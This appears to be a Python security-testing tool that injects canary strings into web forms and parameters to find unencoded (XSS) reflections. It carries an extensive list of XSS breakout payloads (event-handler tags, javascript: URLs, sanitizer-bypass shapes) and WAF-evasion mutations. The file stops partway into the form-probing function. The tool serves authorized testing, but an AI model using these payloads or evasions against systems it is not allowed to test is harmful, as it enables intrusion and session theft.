#!/usr/bin/env python3
"""
dxadyn - dynamic reflection verifier, the companion to dxa.

dxa is *static*: it reads code and says "this looks like a source -> sink flow."
dxadyn is *dynamic*: it drives a running target, injects a unique canary into
inputs, and checks whether the injected markup survives **unencoded** somewhere -
in the same response (reflected) or on a later page (stored). That turns dxa's
"suspicious" into an evidence-backed "reflected unencoded here" candidate.

  static  (dxa)     : grep code for innerHTML/eval/... + source -> sink taint
  dynamic (dxadyn)  : send canary -> read response(s) -> did markup survive raw?

Two modes:
  reflected (default): crawl a URL, inject into every form field / GET param, check
                       the same response.
  stored (--stored)  : POST/GET a single form on --target, then look for the canary
                       on each of --check URL(s).

Auth:
  --login/--user/--pass : classic HTML-form login (CSRF token picked up).
  --cookie "s=..."      : paste a session cookie from DevTools - the escape hatch
                          for SPA / OAuth / MFA targets where a scripted form
                          login cannot apply. Combine with --header for bearer
                          tokens / CSRF headers.

Stdlib only (no dependencies), same ethos as dxa. It reports *candidates* - a raw
reflection is a strong signal, not proof of execution; confirm each by hand in the
browser (does the payload actually run?).

Scope & ethics: authorized / local targets only (your own instance or an in-scope
bug-bounty/VDP asset). Never point it at a target you are not allowed to test.

Usage
-----
  # reflected (v1)
  python dxadyn.py http://localhost:8090/
  python dxadyn.py http://localhost:8090/ --depth 1

  # stored, authenticated (v2)  -- Bludit tags-XSS example
  python dxadyn.py --stored \\
      --login http://localhost:8090/admin/login --user admin --pass labpass123 \\
      --target http://localhost:8090/admin/new-content --target-field tags \\
      --extra title=probe,slug=dxaprobe,content=b,type=published \\
      --check http://localhost:8090/tag/CANARY_KEY_HERE
"""

import argparse
import concurrent.futures
import datetime
import html as htmllib
import http.cookiejar
import json
import random
import re
import secrets
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

UA = "dxadyn/0.1 (authorized local testing)"

# The canary is a unique id + a markup payload. If the payload survives RAW in the
# response, the value was reflected into an HTML context without encoding.
MARKUP = '<dXsS>'          # the tag that must survive raw to count as unencoded
ATTR_MARK = '"'           # a bare double-quote surviving raw = attribute breakout


# v3.10: payload variants for context-aware probing.
# Each variant is (suffix_appended_to_cid, marker_that_must_survive_raw).
# `suffix` is what gets sent; `marker` is what verdict() looks for AFTER cid.
# The historical default `body` is the same shape as make_canary() was: an
# attribute-quote followed by a benign tag. The others are payloads tuned to
# a specific reflection context that the v3.5 sink-context detector labels.
PAYLOAD_VARIANTS = {
    # v3.10 base five: attribute breakout + close-tag families.
    "body":            ('"<dXsS>',                '<dXsS>'),
    "title-breakout":  ('</title><dXsS>',         '</title><dXsS>'),
    "attr-breakout":   ('"><dXsS>',               '"><dXsS>'),
    "script-breakout": ("';<dXsS>//",             '<dXsS>'),
    "url-scheme":      ('javascript:/*<dXsS>*/',  'javascript:/*<dXsS>*/'),

    # Phase 1.2 additions: event-handler tags (the most common real-world
    # XSS execution vectors). Each is a fully-formed HTML tag that runs an
    # attribute handler in a browser. The marker embeds the tag so the
    # verdict fires only if the tag itself survived raw, not just the
    # `<dXsS>` grep-marker after it. All names end in `-breakout` so
    # _apply_ct_gate upgrades severity to executable when unencoded.
    "svg-breakout":            ('"><svg onload=1><dXsS>',
                                '<svg onload=1><dXsS>'),
    "img-breakout":            ('"><img src=x onerror=1><dXsS>',
                                '<img src=x onerror=1><dXsS>'),
    "body-onload-breakout":    ('"><body onload=1><dXsS>',
                                '<body onload=1><dXsS>'),
    "details-toggle-breakout": ('"><details open ontoggle=1><dXsS>',
                                '<details open ontoggle=1><dXsS>'),
    "input-autofocus-breakout":('"><input autofocus onfocus=1><dXsS>',
                                '<input autofocus onfocus=1><dXsS>'),

    # Modern-HTML5 sanitizer bypass surfaces.
    "iframe-srcdoc-breakout":  ('"><iframe srcdoc="<dXsS>">',
                                '<iframe srcdoc="<dXsS>"'),
    "video-source-breakout":   ('"><video><source onerror=1></video><dXsS>',
                                '<video><source onerror=1></video><dXsS>'),

    # Alternative quote-style breakouts (many templates use single quotes,
    # some frameworks use backticks in attribute values).
    "attr-squote-breakout":    ("'><dXsS>",              "'><dXsS>"),
    "attr-backtick-breakout":  ('`><dXsS>',              '`><dXsS>'),

    # JS/template contexts.
    "template-literal-breakout": ('${(1)}<dXsS>',        '${(1)}<dXsS>'),
    "html-comment-breakout":     ('--><dXsS>',           '--><dXsS>'),

    # Phase 1.2 milestone 2 additions ---------------------------------------
    # Nested-script sanitizer bypass. Some allowlist sanitizers strip
    # <script> at the top level but do not recurse into SVG/MathML foreign
    # content, so the inner <script> executes.
    "svg-script-nested-breakout": (
        '"><svg><script>1</script></svg><dXsS>',
        '<svg><script>1</script></svg><dXsS>',
    ),
    # MathML foreign-content surface. mglyph is a rare sink that some
    # DOMPurify-derivatives missed until 2.4+.
    "math-mtext-breakout": (
        '"><math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
        '<math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
    ),
    # Plugin-object surfaces. Rarely allowlisted but sometimes reach the
    # DOM through Markdown or WYSIWYG editors.
    "object-data-breakout": (
        '"><object data=data:text/html,<dXsS>></object>',
        '<object data=data:text/html,<dXsS>></object>',
    ),
    "embed-src-breakout": (
        '"><embed src=data:text/html,<dXsS>>',
        '<embed src=data:text/html,<dXsS>>',
    ),
    # Legacy tags with modern event handlers. Sanitizers focused on
    # <script>/<img>/<svg> often forget these.
    "marquee-onstart-breakout": (
        '"><marquee onstart=1><dXsS></marquee>',
        '<marquee onstart=1><dXsS></marquee>',
    ),
    "select-onfocus-breakout": (
        '"><select autofocus onfocus=1><dXsS></select>',
        '<select autofocus onfocus=1><dXsS></select>',
    ),
    "textarea-onfocus-breakout": (
        '"><textarea autofocus onfocus=1><dXsS></textarea>',
        '<textarea autofocus onfocus=1><dXsS></textarea>',
    ),
    # HTML5 form action override. A stored button with `formaction=` hijacks
    # the submit destination of the outer form.
    "form-formaction-breakout": (
        '"><form><button formaction=javascript:1><dXsS></button></form>',
        '<form><button formaction=javascript:1><dXsS></button></form>',
    ),
    # data: URI iframe. Bypasses text-only sanitizers because the payload
    # rides inside the iframe's src attribute value.
    "iframe-data-uri-breakout": (
        '"><iframe src=data:text/html,<dXsS>>',
        '<iframe src=data:text/html,<dXsS>>',
    ),
    # JS double-quoted string escape. Complements script-breakout (which is
    # single-quoted). Together they cover both string-quote conventions.
    "js-double-string-breakout": (
        '";<dXsS>//',
        '<dXsS>',
    ),
    # javascript: href on anchor. Extremely common in real targets; users
    # click, alert fires.
    "anchor-href-javascript-breakout": (
        '"><a href=javascript:1><dXsS></a>',
        '<a href=javascript:1><dXsS></a>',
    ),
    # <noscript> context. Some sanitizers do NOT parse noscript children
    # (because scripting is assumed on) so injected content leaks in.
    "noscript-breakout": (
        '"><noscript><p title="</noscript><dXsS>',
        '</noscript><dXsS>',
    ),
    # <style> block. CSS injection surface -- @import can pull external
    # payload, but even without it the tag survival proves the escape.
    "style-tag-breakout": (
        '"><style>@import url(<dXsS>)</style>',
        '<style>@import url(<dXsS>)</style>',
    ),

    # Phase 1.2 milestone 3 additions ---------------------------------------

    # CSS-context breakouts. Payload lands inside a style attribute or a
    # <style> block; needs to close the current CSS syntactic construct.
    "style-value-breakout": (
        ';background:url(<dXsS>);',
        ';background:url(<dXsS>);',
    ),
    "css-comment-breakout": (
        '*/<dXsS>',
        '*/<dXsS>',
    ),
    "css-import-breakout": (
        ');<dXsS>',
        ');<dXsS>',
    ),

    # HTML5 dialog element. Post-2022 additions; older sanitizers do not
    # know about oncancel / onbeforetoggle attributes.
    "dialog-onbeforetoggle-breakout": (
        '"><dialog open onbeforetoggle=1><dXsS></dialog>',
        '<dialog open onbeforetoggle=1><dXsS></dialog>',
    ),
    "dialog-oncancel-breakout": (
        '"><dialog open oncancel=1><dXsS></dialog>',
        '<dialog open oncancel=1><dXsS></dialog>',
    ),

    # Attribute-list injection. Stays INSIDE the current tag by opening one
    # attribute and appending a handler + a swallow-comment. Different
    # mechanism from attr-breakout (which escapes the tag entirely) - many
    # sanitizers block `>` but allow bare `"`.
    "attr-inject-onerror-breakout": (
        '" onerror=1//',
        '" onerror=1//',
    ),
    "attr-inject-onmouseover-breakout": (
        '" onmouseover=1//',
        '" onmouseover=1//',
    ),

    # URL-context tags that hijack navigation. `<base href=javascript:>`
    # rewrites every subsequent relative URL. `<meta http-equiv=refresh>`
    # navigates automatically.
    "base-href-javascript-breakout": (
        '"><base href=javascript:1//><dXsS>',
        '<base href=javascript:1//><dXsS>',
    ),
    "meta-refresh-breakout": (
        '"><meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
        '<meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
    ),

    # SVG-namespace event handlers beyond onload. animate/set can fire
    # without user interaction.
    "svg-animate-onbegin-breakout": (
        '"><svg><animate onbegin=1><dXsS></svg>',
        '<svg><animate onbegin=1><dXsS></svg>',
    ),

    # Media surface complement to video-source-breakout.
    "audio-onerror-breakout": (
        '"><audio><source onerror=1></audio><dXsS>',
        '<audio><source onerror=1></audio><dXsS>',
    ),

    # Legacy tags still parsed by every mainstream browser. Some allowlist
    # sanitizers explicitly bless <xmp> as "safe pre-formatted text",
    # forgetting that anything AFTER </xmp> re-enters normal parsing.
    "xmp-breakout": (
        '</xmp><dXsS>',
        '</xmp><dXsS>',
    ),

    # JS-context complements.
    "js-regex-breakout": (
        '/;<dXsS>//',
        '<dXsS>',
    ),
    "js-comment-close-breakout": (
        '*/<dXsS>',
        '*/<dXsS>',
    ),

    # HTML5 template/slot. Web Components content boundary; some
    # sanitizers stop at <template> and leave its shadow tree unscrubbed.
    "template-shadow-breakout": (
        '"><template shadowrootmode=open><script>1</script></template><dXsS>',
        '<template shadowrootmode=open><script>1</script></template><dXsS>',
    ),
}


# WAF-bypass mutations. Each takes the base variant's canary + marker and
# returns an alternate shape that keeps the same `cid` prefix. The idea: if
# the base payload is blocked by a regex WAF (rules that match <dXsS> or
# <script literal etc.), one of these variants may still slip through by
# obfuscating the parts the WAF pattern anchored on.
#
# Every mutation must produce a shape that (a) a lenient HTML parser
# re-forms into the intended tag and (b) transforms both the sent canary
# and the verdict marker identically, so verdict() still finds it in the
# response body.
_WAF_MUTATIONS = [
    # (name, marker_transform) -- both sides get the same replacement
    # v3.10 originals:
    ("case",              lambda s: s.replace('<dXsS>', '<DxSs>')),
    ("split-cmt",         lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
    ("whitespace",        lambda s: s.replace('<dXsS>', '<dXsS  >')),
    ("url-encode",        lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),

    # Phase 1.2 additions:
    # HTML5 permits tab/newline as whitespace inside a tag; many regex WAFs
    # look only for `<[A-Za-z]+ ` (space) after the tag name.
    ("tab-in-tag",        lambda s: s.replace('<dXsS>', '<dXsS\t>')),
    ("newline-in-tag",    lambda s: s.replace('<dXsS>', '<dXsS\n>')),

    # `<tag/attr=…>` is valid HTML5 — the slash is legal whitespace-like
    # separator. Slips regex WAFs anchored on space.
    ("slash-separator",   lambda s: s.replace('<dXsS>', '<dXsS/>')),

    # Double URL-encode. If the intermediary decodes once and the backend
    # decodes once, we land back to `<dXsS>` on final render. WAFs that
    # only decode once still see `%253C`.
    ("double-url-encode", lambda s: s.replace('<dXsS>', '%253CdXsS%253E')),

    # Phase 1.2 milestone 2 additions --------------------------------------
    # Carriage return is HTML5 whitespace inside a tag; same idea as
    # tab-in-tag / newline-in-tag but a distinct byte a WAF regex may miss.
    ("cr-in-tag",         lambda s: s.replace('<dXsS>', '<dXsS\r>')),

    # Form feed. Rarer WAF coverage than \t\n\r; still HTML5-legal.
    ("form-feed-in-tag",  lambda s: s.replace('<dXsS>', '<dXsS\f>')),

    # CRLF combined. Belt-and-suspenders whitespace bypass.
    ("crlf-in-tag",       lambda s: s.replace('<dXsS>', '<dXsS\r\n>')),

    # Null byte in the tag. Classic bypass for WAFs that treat NUL as a
    # string terminator; the servlet layer often passes the whole thing
    # through. Encoded as %00 so it survives text-based URL transport.
    ("null-byte-tag",     lambda s: s.replace('<dXsS>', '<dXsS%00>')),

    # Backslash before closing bracket. Some WAFs anchor on `<[A-Za-z]+>`
    # exactly; a trailing backslash breaks the pattern but a lenient
    # HTML parser reforms the tag.
    ("backslash-tag",     lambda s: s.replace('<dXsS>', '<dXsS\\>')),

    # Phase 1.2 milestone 3 additions --------------------------------------

    # Space + tab combo. A few WAF regexes normalise \s but stop at the
    # first whitespace class match; a mixed run confuses length-based rules.
    ("space-tab-mix",     lambda s: s.replace('<dXsS>', '<dXsS \t>')),

    # Triple URL-encode. For reverse-proxy chains where each hop decodes
    # once. Rare but exists in enterprise stacks with three-tier ingress.
    ("triple-url-encode", lambda s: s.replace('<dXsS>', '%25253CdXsS%25253E')),

    # Lowercase percent-hex. Some WAF signatures anchor uppercase (`%3C`)
    # only; the RFC allows either case and browsers accept both.
    ("percent-lowercase", lambda s: s.replace('<dXsS>', '%3cdXsS%3e')),

    # Comment split AFTER the tag name (not inside). Distinct from split-cmt
    # because the WAF regex might tolerate that position differently.
    ("split-cmt-suffix",  lambda s: s.replace('<dXsS>', '<dXsS<!---->>')),

    # CR + space combined. Belt-and-suspenders whitespace variant that
    # some CRS rules explicitly do NOT normalise together.
    ("cr-space-mix",      lambda s: s.replace('<dXsS>', '<dXsS\r >')),
]


def _waf_mutations(base_canary, marker):
    """Return list of (mutation_name, canary_str, marker_str) alternates."""
    return [(name, xf(base_canary), xf(marker)) for name, xf in _WAF_MUTATIONS]


def make_canary(variant="body"):
    """A fresh, greppable, collision-free marker per injection.
    Backwards-compatible: `make_canary()` returns the historical body-context
    canary. Pass a variant name to get a context-tuned payload for v3.10
    context-aware probing."""
    cid = "dxa" + secrets.token_hex(4)
    suffix, _marker = PAYLOAD_VARIANTS.get(variant, PAYLOAD_VARIANTS["body"])
    return cid, cid + suffix


def make_canaries_for(variants, waf_bypass=False):
    """Yield (variant_name, cid, canary, marker) for each variant. The whole
    v3.10 probe loop uses this to fan out one target-field into N attempts,
    each with its own cid so verdict() can grade them separately.

    If `waf_bypass=True`, after each base variant also yield mutated shapes
    (case-swap, split-tag-comment, whitespace, URL-encode) with fresh cids.
    Mutation variant names are `<variant>/<mut>` (e.g. `body/case`,
    `title-breakout/split-cmt`). Every mutation has its own cid so verdicts
    stay independent."""
    for v in variants:
        suffix, marker = PAYLOAD_VARIANTS.get(v, PAYLOAD_VARIANTS["body"])
        cid = "dxa" + secrets.token_hex(4)
        base_canary = cid + suffix
        yield v, cid, base_canary, marker
        if not waf_bypass:
            continue
        for mut_name, mut_canary, mut_marker in _waf_mutations(base_canary, marker):
            # give each mutation its own cid so its verdict is independent
            mut_cid = "dxa" + secrets.token_hex(4)
            yield (f"{v}/{mut_name}", mut_cid,
                   mut_canary.replace(cid, mut_cid, 1), mut_marker)


def _opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


OPENER = _opener()
EXTRA_HEADERS = {}          # populated by --header / --cookie CLI flags (v3.1)

# Phase 1.1 (2026-09-27): concurrency + rate limit + jitter.
# All three primitives are module-level state so any probe function that
# calls fetch() picks them up without threading its own kwargs. `_rate_gate`
# and `_jitter_gate` run INSIDE fetch(), so every HTTP request pays the same
# rate + jitter cost regardless of which probe path made it.
PARALLEL_WORKERS = 1          # 1 = sequential (default); set by --parallel N
_RATE_LIMITER = None          # RateLimiter instance or None (unlimited)
JITTER_MS_MIN = 0             # inclusive lower bound of pre-request sleep, ms
JITTER_MS_MAX = 0             # inclusive upper bound (0/0 = no jitter)


class _TokenBucket:
    """Thread-safe token bucket. `_rate_gate()` calls .take() which blocks
    until a token is available. Refills continuously (tokens += elapsed * rate)
    up to `capacity`. Capacity = rate keeps bursts within a 1-second window.
    Tiny (~30 lines), no third-party dep."""
    def __init__(self, rate_per_sec):
        self.rate = float(rate_per_sec)
        self.capacity = float(rate_per_sec)
        self.tokens = float(rate_per_sec)
        self.last = time.monotonic()
        self._lock = threading.Lock()

    def take(self):
        while True:
            with self._lock:
                now = time.monotonic()
                self.tokens = min(self.capacity,
                                  self.tokens + (now - self.last) * self.rate)
                self.last = now
                if self.tokens >= 1.0:
                    self.tokens -= 1.0
                    return
                deficit = 1.0 - self.tokens
                wait = deficit / self.rate
            time.sleep(min(wait, 0.5))     # cap sleep so shutdown stays responsive


def _rate_gate():
    """Called at the top of fetch(). Blocks until the token bucket lets us
    through; no-op if --rate wasn't set."""
    if _RATE_LIMITER is not None:
        _RATE_LIMITER.take()


def _jitter_gate():
    """Called at the top of fetch(). Sleeps a random duration in
    [JITTER_MS_MIN, JITTER_MS_MAX] ms; no-op if both are 0. Uses random.uniform
    (thread-safe under CPython)."""
    if JITTER_MS_MAX > 0:
        lo, hi = JITTER_MS_MIN, JITTER_MS_MAX
        if lo > hi:
            lo, hi = hi, lo
        time.sleep(random.uniform(lo, hi) / 1000.0)


def _parallel_map(func, items):
    """Run `func(item)` for each item, either sequentially (PARALLEL_WORKERS
    <= 1) or via a bounded ThreadPoolExecutor. Return results in INPUT order
    so downstream code that iterates variants gets deterministic output.
    Exceptions surface as usual - the executor swallows nothing."""
    items = list(items)
    if PARALLEL_WORKERS <= 1 or len(items) <= 1:
        return [func(x) for x in items]
    with concurrent.futures.ThreadPoolExecutor(
            max_workers=min(PARALLEL_WORKERS, len(items))) as pool:
        return list(pool.map(func, items))


# Phase 0.2 (2026-09-26): false-negative discipline.
# When the bot sends a canary and the SERVER actively refuses it (403, 429,
# WAF-style 400, connection error), record that fact instead of silently
# treating "no reflection" as "target is safe". The scan summary at the end
# tells the operator: N reflections found, K submits rejected - so silence
# in the reflections column stops being ambiguous.
SKIPPED_SUBMITS = []        # list of {canary_id, url, method, variant, status, reason}
VERBOSE = False             # print each skip inline (set by main() from --verbose)
WAF_LOG_FILE = None         # append rejected canaries to this file (set from --waf-log)

# Patterns that, on a 4xx/5xx response, suggest the layer that rejected the
# request was a WAF / edge filter rather than the target app's own validation.
_WAF_INDICATORS = re.compile(
    r'\b(?:blocked?|denied|forbidden|waf|firewall|security\s+policy|'
    r'incident\s+id|access\s+denied|banned|rate\s*limit(?:ed)?|'
    r'suspicious\s+activity|malicious\s+request|policy\s+violation|'
    r'threat\s+detected|cloudflare|akamai|imperva|barracuda)\b',
    re.IGNORECASE,
)


def _classify_response(status, body):
    """Return (was_skip, reason). Informational only - never overrides
    verdicting. A 4xx that still echoes the canary is still a finding; a
    4xx that swallowed the canary just tells the operator WHY silence."""
    if status is None:
        return True, "connection-error"
    peek = (body or "")[:2000]
    if status == 403:
        return True, "waf-403" if _WAF_INDICATORS.search(peek) else "forbidden"
    if status == 429:
        return True, "rate-limit"
    if status == 503 and _WAF_INDICATORS.search(peek):
        return True, "waf-503"
    if 500 <= status < 600:
        return True, "server-error"
    if status == 400 and _WAF_INDICATORS.search(peek):
        return True, "waf-400"
    return False, None


def _record_skip(cid, url, method, variant, status, reason, canary=None):
    """Append a skip event to SKIPPED_SUBMITS; honour VERBOSE + WAF_LOG_FILE.
    Best-effort file write - a failed log never aborts the scan."""
    entry = {"canary_id": cid, "url": url,
             "method": (method or "GET").upper(),
             "variant": variant, "status": status, "reason": reason}
    SKIPPED_SUBMITS.append(entry)
    if VERBOSE:
        print(f"[skip] {url}  [{entry['method']}]  variant={variant}  "
              f"reason={reason}  status={status}  cid={cid}",
              file=sys.stderr)
    if WAF_LOG_FILE is not None and canary is not None:
        try:
            with open(WAF_LOG_FILE, "a", encoding="utf-8") as fh:
                fh.write(f"{reason}\t{status}\t{cid}\t{entry['method']}\t"
                         f"{url}\t{canary}\n")
        except OSError:
            pass


def _maybe_record_skip(v, cid, url, method, variant, status, body, canary=None):
    """Convenience: if verdict wasn't a reflection AND response looked like
    an active rejection, record it. Called by every probe path."""
    if v in ("unencoded", "attr-only"):
        return
    was_skip, reason = _classify_response(status, body or "")
    if was_skip:
        _record_skip(cid, url, method, variant, status, reason, canary)


def _print_skip_summary():
    """Print the Phase 0.2 tail summary. Shown after every scan mode so silence
    in the findings column can be distinguished from active rejection. When
    nothing was skipped, prints a one-line 'submits clean' note so the operator
    knows the discipline ran (not that it was disabled)."""
    if not SKIPPED_SUBMITS:
        print("[dxadyn] submits clean: 0 rejected (no 403/429/WAF/connection-error).")
        return
    counts = {}
    for e in SKIPPED_SUBMITS:
        counts[e["reason"]] = counts.get(e["reason"], 0) + 1
    breakdown = ", ".join(f"{k}: {v}" for k, v in
                          sorted(counts.items(), key=lambda kv: -kv[1]))
    print(f"[dxadyn] {len(SKIPPED_SUBMITS)} submit(s) rejected by the server "
          f"(silence != safe). Breakdown: {breakdown}."
          + ("" if VERBOSE else "  Re-run with --verbose to see each one.")
          + ("" if WAF_LOG_FILE is None else f"  Full log: {WAF_LOG_FILE}."))


def fetch(url, data=None, method=None, extra=None):
    """GET (data=None) / POST (data=dict) / any HTTP method (method='PUT'|...).
    Returns (status, final_url, body, content_type). `content_type` comes from
    the response Content-Type header (lowercased, empty string if missing) and
    is what the v3.7 gate uses to distinguish `application/json` from HTML.

    Phase 1.1: `extra` is a per-request headers dict. Unlike the module-level
    EXTRA_HEADERS (which is set once by --header / --cookie and stays the same
    across the run), `extra` is passed by the caller for THIS request only -
    e.g. probe_headers plugs the injected header value here. This eliminates
    the previous 'mutate EXTRA_HEADERS then pop' dance, which was not
    thread-safe under --parallel.

    Also honours RATE_LIMITER (Phase 1.1 token bucket) and JITTER_MS_MIN/MAX
    (pre-request sleep) so bursts across threads don't stampede the target."""
    _rate_gate()
    _jitter_gate()
    if isinstance(data, (bytes, bytearray)):
        body_bytes = bytes(data)
    elif data is None:
        body_bytes = None
    else:
        body_bytes = urllib.parse.urlencode(data).encode()
    headers = {"User-Agent": UA}
    headers.update(EXTRA_HEADERS)                            # user-supplied wins
    if extra:
        headers.update(extra)                                # per-request override
    kwargs = {"data": body_bytes, "headers": headers}
    if method:
        kwargs["method"] = method.upper()
    req = urllib.request.Request(url, **kwargs)
    try:
        with OPENER.open(req, timeout=15) as resp:
            ct = (resp.headers.get("Content-Type") or "").lower()
            return (resp.status, resp.geturl(),
                    resp.read().decode("utf-8", "ignore"), ct)
    except urllib.error.HTTPError as e:
        ct = (e.headers.get("Content-Type") if e.headers else "") or ""
        return e.code, url, e.read().decode("utf-8", "ignore"), ct.lower()
    except Exception as e:                                    # noqa: BLE001
        return None, url, f"__error__: {e}", ""


def apply_cookie(cookie_header_value):
    """Register a raw `Cookie:` header string (e.g. 'sid=abc; csrf=xyz') so it
    rides every request. This is the fastest path to probing an authenticated
    surface: log in through the target's real UI (a browser handles SPA / OAuth
    / MFA), copy the session cookie from DevTools, paste it here."""
    if cookie_header_value:
        EXTRA_HEADERS["Cookie"] = cookie_header_value


def apply_header(spec):
    """Register a single 'Name: value' header. Repeatable via CLI --header."""
    if not spec or ":" not in spec:
        return False
    name, val = spec.split(":", 1)
    name, val = name.strip(), val.strip()
    if not name:
        return False
    EXTRA_HEADERS[name] = val
    return True


# --- v3.5: sink-context awareness + finding dedup ---------------------------

# Attribute names whose values are URLs (a javascript: scheme here executes).
_URL_ATTRS = {"href", "src", "action", "formaction", "xlink:href", "data",
              "poster", "background", "srcset"}


def find_context(cid, body):
    """Where does the first `cid` occurrence sit in the response HTML?
    Returns one of:
      'body'        - free markup context; a raw <img onerror> executes
      'title'       - inside <title>...</title>; needs </title> breakout to run
      'script'      - inside <script>...</script>; needs JS-string breakout
      'attr:NAME'   - inside an HTML attribute value; needs " or ' breakout
      'url-attr:NAME' - href/src/action/... value; a `javascript:` URL executes
      'unknown'     - cid not present (should not happen when we call this)
    This is what turns "the payload reflected raw" into "the payload actually
    executes without further tricks" - the practical difference between a
    reportable exploit and a reflection that still needs a follow-on breakout
    step (which we hit repeatedly on Bludit's <title>-only tag XSS)."""
    i = body.find(cid)
    if i == -1:
        return "unknown"
    before_low = body[max(0, i - 800): i].lower()

    # inside a <title> that hasn't closed yet?
    ti = before_low.rfind("<title")
    if ti != -1 and "</title" not in before_low[ti:]:
        return "title"
    # inside a <script> that hasn't closed?
    si = before_low.rfind("<script")
    if si != -1 and "</script" not in before_low[si:]:
        return "script"
    # inside an opening tag whose > hasn't been seen yet -> attribute context
    lt = before_low.rfind("<")
    gt = before_low.rfind(">")
    if lt > gt:
        tag_seg = before_low[lt:]
        m = re.search(r'([a-z_:][\w:-]*)\s*=\s*["\']?[^"\'<>]*$', tag_seg)
        if m:
            name = m.group(1)
            if name in _URL_ATTRS:
                return f"url-attr:{name}"
            return f"attr:{name}"
        return "attr"
    return "body"


def context_executes(context):
    """True iff `context` renders the raw canary as executable JavaScript
    WITHOUT any extra breakout step. The other contexts still flag a
    reflection (the value survived unescaped) but need an additional payload
    shape to execute - dxadyn reports both and lets the operator judge."""
    return context in ("body", "unknown")


def _severity(reflection, context):
    """Combine verdict + context into a single severity label:
      executable    - HIGH + body/unknown context: <img onerror> works as-is
      breakout-req  - HIGH + title/script/attr context: needs a follow-on payload
      attr-breakout - verdict is 'attr-only' (a bare " survived)
      json-only     - HIGH but response is JSON/text (not parsed as HTML)
      -             - not a reportable case
    v3.7 note: `json-only` is set by _apply_ct_gate() when Content-Type says
    the browser will not render this response as HTML."""
    if reflection == "unencoded":
        return "executable" if context_executes(context) else "breakout-req"
    if reflection == "attr-only":
        return "attr-breakout"
    return "-"


# --- v3.7: Content-Type gate ------------------------------------------------

_HTML_LIKE_CT = ("text/html", "application/xhtml+xml", "image/svg+xml")
_JSON_LIKE_CT = ("application/json", "application/ld+json", "text/json",
                 "application/hal+json", "application/problem+json")


def _is_html_response(content_type):
    """True iff the browser will parse this response as HTML by default. Empty
    or unknown CT is treated as HTML because sniffing is browser-default when
    `X-Content-Type-Options: nosniff` is absent - we can't see that header
    without a fuller response object, so lean toward reporting (fewer FNs)."""
    if not content_type:
        return True
    ct = content_type.split(";", 1)[0].strip()
    if ct in _HTML_LIKE_CT:
        return True
    # any text/* that isn't explicitly JSON/CSV/plain markup we treat as HTML
    if ct.startswith("text/") and ct not in ("text/json", "text/plain",
                                              "text/csv"):
        return True
    return False


def _apply_ct_gate(reflection, context, content_type, variant="body"):
    """v3.7 + v3.10: Content-Type gate + variant-aware severity.

    HTML response:
      - v3.10: if `variant` is a `-breakout` (title/attr/script) and the
        reflection is `unencoded`, the breakout payload PROVED the escape:
        the marker survived AFTER the closing token, so it's effectively in
        body context now. Severity = executable regardless of `context`
        (which reflects where the cid landed, not the marker).
      - Otherwise, fall through to the plain (reflection, context) severity.
    Non-HTML response (JSON/text): reflection is real cross-boundary but the
    browser will not parse it as HTML - severity downgrades to `json-only`.
    """
    if _is_html_response(content_type):
        if reflection == "unencoded" and variant.endswith("-breakout"):
            return context, "executable"
        return context, _severity(reflection, context)
    if reflection == "unencoded":
        return "json-body", "json-only"
    if reflection == "attr-only":
        return "json-body", "-"
    return context, "-"


def dedupe_findings(findings):
    """Collapse findings that share the same (canary_id, reflection, context)
    - a stored payload that surfaces on many admin/preview pages is the same
    bug repeated (WonderCMS live-fire example: 58 near-identical rows). Keep
    the first occurrence, tuck the rest of the URLs into a `duplicates` list
    on it, and drop them from the primary list."""
    seen, out = {}, []
    for f in findings:
        cid = f.get("canary_id") or f.get("canary") or id(f)
        key = (cid, f.get("reflection"), f.get("context"))
        if key in seen:
            primary = seen[key]
            primary.setdefault("duplicates", []).append(
                f.get("check_url") or f.get("url"))
        else:
            seen[key] = f
            out.append(f)
    return out


def verdict(cid, body, marker=MARKUP):
    """Classify how the canary came back. The check inspects the char(s)
    IMMEDIATELY after each cid occurrence - a gap between cid and the follow-on
    means the id landed inside a slug/URL/attribute VALUE by coincidence, not
    the raw canary payload itself.
      unencoded : cid is followed by the raw `marker` (quote may be encoded)
      attr-only : cid is followed IMMEDIATELY by a raw quote (marker didn't survive)
      encoded   : cid is present but neither of the above
      absent    : cid not in body
    v3.10: `marker` defaults to MARKUP (`<dXsS>`) so single-variant callers
    are unaffected; variant-aware callers pass the marker for that variant."""
    if cid not in body:
        return "absent"
    weak = None
    span = len(marker) + 8                                    # room past &quot;
    i = 0
    while True:
        j = body.find(cid, i)
        if j == -1:
            break
        after = body[j + len(cid): j + len(cid) + max(60, len(marker) + 20)]
        # strongest signal: marker survives raw right after cid
        if after.startswith(ATTR_MARK + marker) or after.startswith(marker):
            return "unencoded"
        if marker in after[:span]:                            # marker within a few chars
            return "unencoded"
        # medium: char right after cid is a raw, unescaped quote
        if after.startswith(ATTR_MARK):
            weak = weak or "attr-only"
        i = j + 1
    return weak or "encoded"


class FormParser(HTMLParser):
    """Collect forms (action, method, fields) and links carrying query params."""
    def __init__(self):
        super().__init__()
        self.forms = []
        self.links = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method") or "get").lower(),
                         "fields": {}}
        elif tag in ("input", "textarea", "select") and self._cur is not None:
            name = a.get("name")
            if name and a.get("type") not in ("submit", "button", "file", "image"):
                self._cur["fields"][name] = a.get("value", "")
        elif tag == "a":
            href = a.get("href", "")
            if "?" in href and "=" in href.split("?", 1)[1]:
                self.links.append(href)

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def discover(base_url, body):
    p = FormParser()
    try:
        p.feed(body)
    except Exception:                                        # noqa: BLE001
        pass
    forms = [{**f, "action": urllib.parse.urljoin(base_url, f["action"] or base_url)}
             for f in p.forms]
    links = [urllib.parse.urljoin(base_url, h) for h in p.links]
    return forms, links


def probe_form(form, variants=None, waf_bypass=False):
    """Inject a canary into each field in turn; report unencoded reflections.
    v3.10: fan-out through `variants` (+ optional --waf-bypass mutations).
